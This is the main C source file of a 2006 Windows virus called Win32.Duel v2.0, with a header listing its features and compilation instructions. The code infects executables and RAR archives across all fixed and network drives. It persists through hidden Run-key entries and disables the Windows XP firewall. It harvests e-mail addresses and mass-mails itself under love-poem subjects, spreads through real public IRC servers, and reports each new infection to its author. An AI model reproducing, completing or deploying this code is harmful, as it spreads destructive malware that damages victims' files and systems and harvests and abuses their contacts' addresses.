/*

|-----------------------------------------------------------------------|
|Win32.Duel v2.0 (c) 2006 by DR-EF										|
|---------------------------------										|
|Virus Name	:Win32.Duel													|
|Virus Type	:PE/Rar Infector & Massmailer & IrcWorm						|
|Virus Author	:DR-EF													|
|Author Homepage:http://home.arcor.de/dr-ef/							|
|																		|
|Virus Features	:														|
|----------------														|
|		1)Infect PE files by adding loader code into the				|
|	  	  aligned space of the host's code section (same				|
|	  	  (as win32.x-worm)												|
|		2)infecting Rar archives by adding virus file					|
|		3)does not infect sfc protected files							|
|																		|
|Mail Worm Features:													|
|-------------------													|
|		1)find emails in txt,htm,hta & in the Windows address			|
|		  book															|
|		2)use its own base64 encoder & smtp engine						|
|		3)spoof sender address											|
|																		|
|IrcWorm Features:														|
|-----------------														|
|		1)multi irc servers												|
|		2)its own http server & irc cliant								|
|		3)can spam url to http server & send dcc request to				|
|		  transfer itself												|
|																		|
|General Malware Features:												|
|-------------------------												|
|		1)run as service process under win9x/me							|
|		2)disable winxp firewall										|
|		3)destructive payload											|
|		4)operation log system											|
|		5)notify on irc for every new infection							|
|		6)use mutex to avoid multi executions							|
|		7)kill av/firewalls/anti trojan programs						|
|																		|
|How To Compile:														|
|---------------														|
|		use microsoft visual c++ 6 with the latest updates to			|
|		compile that virus												|
|-----------------------------------------------------------------------|


*/


#include "stdafx.h"
#include "prototypes.h"
#include "xIrcWorm.h"


#define RSP_SIMPLE_SERVICE 1

#define MAX_MAILS		0x50
#define MAX_MAIL_SIZE	0x44

char DuelRunningPath[MAX_PATH];
const char wormfname[]="\\Duel_v2.exe";
const char regkey[]="Win32_Duel_v2";		//Duel worm :)


FARPROC xSfcIsFileProtected;
HMODULE	hSFC;
BOOL Sfc_Exist=FALSE;

Duel_MailList	xml;
MailInfoList	MIL;


char *Irc_Servers[]={"irc.undernet.org","irc.dal.net","irc.rizon.net",
					"irc.ircnet.net","irc.quakenet.org","irc.efnet.net"};

#define N_Irc_Servers 6

BOOL Dual_Execuble_Infect(char Path[])
{
	InfectPeFile(Path,DuelRunningPath);
	return TRUE;
}

BOOL Duel_RarArchive_Infect(char Path[])
{
	char xrndstr[30];
	RandomString(xrndstr,7,TRUE);
	lstrcat(xrndstr,".exe");
	return AddToRar(Path,DuelRunningPath,xrndstr,FILE_ATTRIBUTE_NORMAL);
}

BOOL Duel_IsSfcProtected(char Path[])
{
	WCHAR wszFileName[MAX_PATH];
	BOOL retval=FALSE;

	if(Sfc_Exist==TRUE)
	{
		MultiByteToWideChar(CP_ACP, 0, Path, -1, wszFileName, MAX_PATH) ;

		__asm
		{
			lea	 eax,wszFileName
			push eax
			push NULL
			call [xSfcIsFileProtected]
			mov	 [retval],eax
		}
	}

	return retval;
}

void Duel_File_Scanner()
{
	WIN32_FIND_DATA wfd;
	HANDLE hfind;
	char fullpath[MAX_PATH];
	LPTSTR xaddr=NULL;

	hfind=FindFirstFile("*.*",&wfd);

	if(hfind!=INVALID_HANDLE_VALUE)
	{
		do
		{
			if(wfd.cFileName[0]!='.')
			{
				wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;

				if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY) //is directory ?
				{
					if(SetCurrentDirectory(wfd.cFileName)==TRUE)
					{
						Duel_File_Scanner();
						SetCurrentDirectory("..");	//return to upper directory
					}
				}
				else
				{
					if(GetFullPathName(wfd.cFileName,MAX_PATH,fullpath,&xaddr)!=0)
					{
						CharLower(fullpath);

						if(memcmp(fullpath+lstrlen(fullpath)-3,"rar",3)==0)
						{
							AddToLog(fullpath,Duel_Log_RarArchive,
								Duel_RarArchive_Infect(fullpath));
						}
						else if(memcmp(fullpath+lstrlen(fullpath)-3,"scr",3)==0)
						{
							if(Duel_IsSfcProtected(fullpath)==FALSE)
								Dual_Execuble_Infect(fullpath);
						}
						else if(memcmp(fullpath+lstrlen(fullpath)-3,"exe",3)==0)
						{
							if(Duel_IsSfcProtected(fullpath)==FALSE)
								Dual_Execuble_Infect(fullpath);
						}
						else if(wfd.nFileSizeLow<0x1e000 && xml.NumberOfMails<(Duel_Max_Mails-1))
						{
							if(memcmp(fullpath+lstrlen(fullpath)-3,"htm",3)==0)
							{
								FindMails(fullpath,xml);
							}
							else if(memcmp(fullpath+lstrlen(fullpath)-3,"txt",3)==0)
							{
								FindMails(fullpath,xml);
							}
							else if(memcmp(fullpath+lstrlen(fullpath)-3,"hta",3)==0)
							{
								FindMails(fullpath,xml);
							}
						}
					}
				}
			}

		}while(FindNextFile(hfind,&wfd));

		FindClose(hfind);
	}
}

void DuelInit()
{
	HMODULE hk32;
	HKEY hkeyz[2]={HKEY_LOCAL_MACHINE,HKEY_CURRENT_USER},hkey;
	char installed_worm[MAX_PATH];
	DWORD disable_val=4,SizeOf_disable_val=sizeof(DWORD),Sxiw=sizeof(installed_worm);
	int i;


unsigned char encrypted_start_key[45] =
{
    0xBC, 0x80, 0x89, 0x9B, 0x98, 0x8E, 0x9D, 0x8A,
	0xB3, 0xA2, 0x86, 0x8C, 0x9D, 0x80, 0x9C, 0x80,
    0x89, 0x9B, 0xB3, 0xB8, 0x86, 0x81, 0x8B, 0x80,
	0x98, 0x9C, 0xB3, 0xAC, 0x9A, 0x9D, 0x9D, 0x8A,
    0x81, 0x9B, 0xB9, 0x8A, 0x9D, 0x9C, 0x86, 0x80,
	0x81, 0xB3, 0xBD, 0x9A, 0x81,
} ;	// x0r 0xEF encrypted : Software\Microsoft\Windows\CurrentVersion\Run

	GetModuleFileName(NULL,DuelRunningPath,MAX_PATH);
	InitMailList(xml);
	hk32=GetModuleHandle("kernel32.dll");

	if(hk32!=NULL)
	{
		if(GetProcAddress(hk32,"RegisterServiceProcess")!=NULL)
		{
			__asm

			{
				push	RSP_SIMPLE_SERVICE
				push	0
				call	eax	//hide the worm under Windows 9x/me
			}
		}
	}

	GetSystemDirectory(installed_worm,MAX_PATH);	//get sysdir

	lstrcat(installed_worm,wormfname);

	CopyFile(DuelRunningPath,installed_worm,FALSE);		//copy worm

	SetFileAttributes(installed_worm,FILE_ATTRIBUTE_HIDDEN);	//hide it

	for(i=0;i<sizeof(encrypted_start_key);i++)
			encrypted_start_key[i]^=0xEF;		//decrypt startup key

	encrypted_start_key[i]=NULL;

	for(i=0;i<2;i++)	//add to start up
	{
		if(RegOpenKeyEx(hkeyz[i],(const char *)encrypted_start_key,0,KEY_WRITE,&hkey)==ERROR_SUCCESS)
		{
			RegSetValueEx(hkey,regkey,0,REG_SZ,(BYTE *)installed_worm,Sxiw);
			RegCloseKey(hkey);
		}
	}

	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,	//disable winXP firewall
		"SYSTEM\\CurrentControlSet\\Services\\SharedAccess",0,KEY_WRITE,&hkey)==ERROR_SUCCESS)
	{
		RegSetValueEx(hkey,"Start",0,REG_DWORD,(BYTE *)&disable_val,SizeOf_disable_val);
		RegCloseKey(hkey);
	}

	hSFC = LoadLibrary("SFC.DLL");

	if(hSFC!=NULL)
	{
		xSfcIsFileProtected =(FARPROC)GetProcAddress(hSFC,"SfcIsFileProtected");

		if(xSfcIsFileProtected!=NULL)
			Sfc_Exist=TRUE;
	}

	if(OpenMutex(MUTEX_ALL_ACCESS,FALSE,CopyRight)!=NULL)
		ExitProcess(1);
	else
		CreateMutex(NULL,FALSE,CopyRight);

	AddToLog(DuelRunningPath,Duel_Log_Startup,TRUE);
}

void DuelInitMil(MailInfoList &MIL)
{
	MIL.number_of_MIL=10;

	lstrcpy(MIL.mail_info_list[0].subject,"Thee and me");
	lstrcpy(MIL.mail_info_list[1].subject,"Yours forever");
	lstrcpy(MIL.mail_info_list[2].subject,"My heart");
	lstrcpy(MIL.mail_info_list[3].subject,"True feelings");
	lstrcpy(MIL.mail_info_list[4].subject,"Me and you");
	lstrcpy(MIL.mail_info_list[5].subject,"A kiss for a smile");
	lstrcpy(MIL.mail_info_list[6].subject,"Valentine (a little late)");
	lstrcpy(MIL.mail_info_list[7].subject,"Love...");

	MIL.NumberOf_Subjects=7;

	lstrcpy(MIL.mail_info_list[0].attachment,"The sky.exe");
	lstrcpy(MIL.mail_info_list[1].attachment,"My wish.exe");
	lstrcpy(MIL.mail_info_list[2].attachment,"My hope.exe");
	lstrcpy(MIL.mail_info_list[3].attachment,"My desire.exe");
	lstrcpy(MIL.mail_info_list[4].attachment,"My love.exe");
	lstrcpy(MIL.mail_info_list[5].attachment,"Forever.exe");
	lstrcpy(MIL.mail_info_list[6].attachment,"A smile.exe");
	lstrcpy(MIL.mail_info_list[7].attachment,"My heart.exe");
	lstrcpy(MIL.mail_info_list[8].attachment,"WantsU.exe");

	MIL.NumberOf_Attachments=7;

	lstrcpy(MIL.mail_info_list[0].text,"A special world for you and me\r\nA special bond one cannot see\r\nIt wraps us up in its cocoon\r\nAnd holds us fiercely in its womb.");
	lstrcpy(MIL.mail_info_list[1].text,"Its fingers spread like fine spun gold\r\nGently nestling us to the fold\r\nBonds like this are meant to last.");
	lstrcpy(MIL.mail_info_list[2].text,"And though at times a thread may break\r\nA new one forms in its wake\r\nTo bind us closer and keep us strong\r\nIn a special world, where we belong.");
	lstrcpy(MIL.mail_info_list[3].text,"My love, I have tried with all my being\r\nto grasp a form comparable to thine own,\r\nbut nothing seems worthy;");
	lstrcpy(MIL.mail_info_list[4].text,"If I could have just one wish,\r\nI would wish to wake up everyday\r\nto the sound of your breath on my neck,\r\nthe warmth of your lips on my cheek,\r\nthe touch of your fingers on my skin,\r\nand the feel of your heart beating with mine...\r\nKnowing that I could never find that feeling\r\nwith anyone other than you.");
	lstrcpy(MIL.mail_info_list[5].text,"I love the way you look at me,\r\nYour eyes so bright and blue.\r\nI love the way you kiss me,\r\nYour lips so soft and smooth.");
	lstrcpy(MIL.mail_info_list[6].text,"I love the way you make me so happy,\r\nAnd the ways you show you care.\r\nI love the way you say, I Love You,\r\nAnd the way you're always there.");
	lstrcpy(MIL.mail_info_list[7].text,"I love the way you touch me,\r\nAlways sending chills down my spine.\r\nI love that you are with me,\r\nAnd glad that you are mine.");
	lstrcpy(MIL.mail_info_list[8].text,"I wrote your name in the sky,\r\nbut the wind blew it away.\r\nI wrote your name in the sand,\r\nbut the waves washed it away.\r\nI wrote your name in my heart,\r\nand forever it will stay.");

	MIL.NumberOf_Texts=8;

	AddToLog("Init Worm Finished",Duel_Log_Custom,TRUE);

}

DWORD WINAPI Scan_Hdds(LPVOID x)
{
	char Drive[]="z:\\";
	UINT drive_type;

	do
	{
		drive_type=GetDriveType(Drive);

		if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
		{
			if(SetCurrentDirectory(Drive)==TRUE)
				Duel_File_Scanner();
		}

		Drive[0]--;

	}while(Drive[0]!='b');

	AddToLog("All Hard-Disks Infection Finished",Duel_Log_Custom,TRUE);

	return 1;
}

DWORD WINAPI WAB_Mailer(LPVOID x)
{
	char	WAB[MAX_MAILS][MAX_MAIL_SIZE];		//windows address book mailist
	short	nWABMails=0;
	Duel_MailList	Wab_xml;
	HKEY hkey;
	char WABFile[MAX_PATH];
	DWORD WF_size=sizeof(WABFile);
	DWORD WF_Type=REG_SZ;
	HANDLE hfile,hmap;
	LPVOID WABase;
	int i=0;

	if(RegOpenKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\WAB\\WAB4\\Wab File Name",
		0,KEY_READ,&hkey)==ERROR_SUCCESS)
	{
		RegQueryValueEx(hkey,"",0,&WF_Type,(BYTE *)WABFile,&WF_size);
		RegCloseKey(hkey);
	}
	else
		return FALSE;

	hfile=CreateFile(WABFile,GENERIC_READ,FILE_SHARE_READ,
		NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if(hfile==INVALID_HANDLE_VALUE)
		return FALSE;

	hmap=CreateFileMapping(hfile,NULL,PAGE_READONLY,NULL,NULL,NULL);

	if(hmap==0)
	{
		CloseHandle(hfile);
		return FALSE;
	}

	WABase=MapViewOfFile(hmap,FILE_MAP_READ,NULL,
		NULL,NULL);

	if(WABase==NULL)
	{
		CloseHandle(hmap);
		CloseHandle(hfile);
		return FALSE;
	}

	__asm
	{
		mov		eax,[WABase]
		push	word ptr [eax + 64h]
		pop		[nWABMails]						;get number of mails
	}

	if(nWABMails<=1)
	{
		UnmapViewOfFile(WABase);
		CloseHandle(hmap);
		CloseHandle(hfile);
		return FALSE;
	}

	if(nWABMails>MAX_MAILS)
		nWABMails=MAX_MAILS;


	__asm
	{
		mov		esi,[WABase]
		movzx	ecx,[nWABMails]
		add		esi,[esi + 60h]						;goto start of mails
		lea		edi,WAB
NMail:	push	ecx									;save number of mails
		xor		ebx,ebx
		mov		ecx,MAX_MAIL_SIZE
NxtChar:lodsb										;read one char
		inc		esi
		mov		byte ptr [edi + ebx],al				;save it !
		cmp		byte ptr [esi],0h
		je		MNextMail
		inc		ebx
		dec		ecx
		loop	NxtChar
MNextMail:
		mov		byte ptr [edi + ebx + 1],0h
		sub		ecx,2h
		add		esi,ecx
		add		edi,MAX_MAIL_SIZE					;move to next field at the array
		pop		ecx
		loop	NMail								;move to next mail
	}

	UnmapViewOfFile(WABase);
	CloseHandle(hmap);
	CloseHandle(hfile);

	for(i=0;i<nWABMails;i++)
		lstrcpy(Wab_xml.Email[i],WAB[i]);

	Wab_xml.NumberOfMails=nWABMails;

	AddToLog("Starting Wab Mailing",Duel_Log_Custom,TRUE);

	DuelMassMail(Wab_xml,MIL,DuelRunningPath);

	AddToLog("Wab Mailing Finished",Duel_Log_Custom,TRUE);

	return TRUE;

}

DWORD WINAPI xIrc_Worm_Thread(LPVOID XircWormInfo)
{
	IrcWormSI IWSI;
	xIrcWorm IrcWorm;
	char Clog[150];

	memcpy(&IWSI,XircWormInfo,sizeof(IrcWormSI));

	IrcWorm.InitWorm(IWSI.Server,IWSI.Port);

	wsprintf(Clog,"Irc Worm Thread Started To %s:%s",IWSI.Server,IWSI.Port);

	AddToLog(Clog,Duel_Log_Custom,TRUE);

	for(;;Sleep(IWSI.SleepTime))
		IrcWorm.StartWorm();

	return 1;
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	MSG msg;
	IrcWormSI IWSI;

	int i;



	DuelInit();
	Sleep(1);
	DuelInitMil(MIL);

	Payload();

	XThread(WAB_Mailer,NULL);    //mail to all wab users
	XThread(WormNotify,NULL);	//notify about the infection
	SetTimer(NULL,NULL,4000,&DisableProtectionPrograms);	//disable av/fw

	XThread(Http_Server,NULL);	//run http server
	XThread(Ident_Server,NULL);	//run ident server

	for(i=0;i<N_Irc_Servers;i++)
	{
		IWSI.Port=6667;
		IWSI.SleepTime=25000;
		lstrcpy(IWSI.Server,Irc_Servers[i]);
		WaitForSingleObject(XThread(xIrc_Worm_Thread,&IWSI),1000);
	}

	XThread(Scan_Hdds,NULL); //scan all directorys for files

	Sleep(60*1000*10);  //sleep 10 minutes

	if(xml.NumberOfMails<5)
		Sleep(60*1000*10);  //sleep again 10 minutes

	DuelMassMail(xml,MIL,DuelRunningPath);

	while(GetMessage(&msg,NULL,0,0)) //stay resident
		DispatchMessage(&msg);

	return 0;
}



